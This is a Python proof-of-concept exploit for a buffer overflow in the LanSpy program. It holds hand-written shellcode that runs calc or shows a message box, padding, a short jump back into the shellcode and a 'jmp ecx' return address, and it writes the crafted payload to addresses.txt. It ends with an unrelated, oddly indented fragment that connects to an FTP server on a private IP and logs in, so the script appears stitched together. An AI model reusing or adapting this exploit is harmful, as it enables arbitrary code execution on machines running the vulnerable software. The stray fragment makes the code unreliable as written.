#!/usr/bin/python

import struct
import socket

# 32bit Alphanum-ish shellcodes
# Bad chars detected: 00 2d 20

# MessageBoxA at => 00404D80
msgbox_shellcode = (
        "\x31\xC0\x50\x68"
        "\x70\x77\x6E\x64"
        "\x54\x5F\x50\x57"
        "\x57\x50\x35\xC4"
        "\x80\x80\x55\x35"
        "\x44\xCD\xC0\x55"
        "\x50\xC3"
        )

# WinExec at -> 004EC4FF
calc_shellcode = (
        "\x31\xC0\x50\x68"
        "\x63\x61\x6C\x63"
        "\x54\x5F\x50\x57"
        "\x35\xC3\x4E\xC3"
        "\x55\x35\x3C\x8A"
        "\x8D\x55\x50\xC3"
        )

# Change the shellcode to be used here
scde = calc_shellcode
#scde = msgbox_shellcode

# 126 are the bytes to jmp back with opcode \x74\x80 => ja -80h and it is where our shellcode resides
junk = 'A'*(676-126) 
if len(scde) > 126:
	exit("[e] Shellcode is too big! Egghunter maybe? ;)")

# 0040407D => jmp ecx inside LanSpy
jecx = 'A'*(126-len(scde))+'\x74\x80CC'+struct.pack('<I', 0x0040407D)

# Junk + Shellcode for calc + jump to our first stage jump which jumps to the second stage calc shellcode
payl = junk + scde + jecx

with open("addresses.txt", "wb") as f:
        f.write(payl)
        f.close()
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	conexion = s.connect(('192.168.63.148',21))
	s.recv(1024)
	s.send('USER ftp\r\n')
	s.recv(1024)
	s.send('PASS ftp\r\n')
	s.recv(1024)
	#s.send(comando + '' + cadena)
	#s.send('USER ftp)
